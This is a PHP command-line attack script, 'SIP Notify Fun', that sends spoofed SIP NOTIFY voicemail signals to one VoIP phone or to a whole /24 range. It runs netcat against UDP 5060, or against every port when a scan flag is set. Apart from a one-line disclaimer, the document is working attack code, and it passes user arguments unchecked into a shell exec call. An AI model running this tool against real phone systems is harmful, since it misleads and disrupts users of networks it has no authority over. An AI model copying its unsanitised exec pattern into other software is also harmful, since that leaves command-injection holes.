#!/usr/bin/php
<?php
#
# SIP Notify Fun (SNF) v 0.1
# (c) Tobias Glemser (tglemser@tele-consulting.com)
# Tele-Consulting | security | networking | training GmbH
#
# send SIP Voicemail messages to single phones or ranges
#
# released under the GPL (see http://www.gnu.org/copyleft/gpl.html)
# if you do any changes I would highly appreciate to be informed - thanks.
#
# ! use only for testing purposes on your own systems !

#ERROR_REPORTING (E_ALL); #debug
ERROR_REPORTING (E_WARNING); #standard

echo "SIP Notify FUN (snf) v. 0.1\nTobias Glemser (tglemser@tele-consulting.com)\n\n";

$target 	= $argv[1];
$cmd 		= $argv[2];
$portscan	= $argv[3];

$countme = explode(".", $target);
if (sizeof($countme) == '4') {
	if (ip2long($target) != '-1') { 
		$host = $target;
		$message = " host " . $target;
	} else {
		$range = $target;
		$message = " range " . $target . "0/24";
	}
}
$exit = 1;


if (((isset($range) && $range != '') || isset($host) && $host != "") && ((isset ($cmd) && $cmd == 'message') || (isset ($cmd) && $cmd == 'no_message'))) 

{ $exit = 0; }


if (isset ($exit) && $exit == 1) {
        echo "Usage:\tphp sip_notify.php x.x.x. command scan (Class-C-Test, please note the trailing dot)\n\t\tor\n\tphp sip_notify.php x.x.x.x command (test one host only)\n\n\tcommand can be 'message' or 'no_message'\n\nyou migh want to add the trigger '-s' to initiate a portscan against the phones (default is sending to 5060/udp only)\n";
        exit();
}

if ($cmd == 'message') { 
	$message = $message . " sending 'new message waiting' signal"; 
}else { 
	$message = $message . " sending 'no message waiting' signal"; 
}

if (!isset ($portscan) && $portscan != '-s') { $portscan = 'no'; }
	

$begin = time();
echo "starting sip notify attack against" . $message . " \n\n";


function send_sip_message ($ip, $cmd, $portscan) {
	$file_new_message 	= 'netcat_sip_new_message.txt';
	$file_no_message 	= 'netcat_sip_no_message.txt';
	if ($cmd == 'message'){	$input_file = $file_new_message; }
	else { 			$input_file = $file_no_message; }
	echo "attacking $ip \n";
	if ($portscan == '-s') { 
		exec ("netcat -u -n -r " . $ip  . " 1-65535 < $input_file -w 1 > /dev/null &");
	} else {
		exec ("netcat -u -n -r " . $ip  . " 5060 < $input_file -w 1 > /dev/null &");
	}
}

if (isset($range)) {
	$x=1;
	while ($x < 255) {
		send_sip_message($range . $x, $cmd, $portscan);
		$x++;
	}
} elseif (isset($host)) {
	send_sip_message($host, $cmd, $portscan);
}

$end = time();
$duration = $end-$begin;
echo "\nattack ended (duration " . $duration . " seconds)\n";
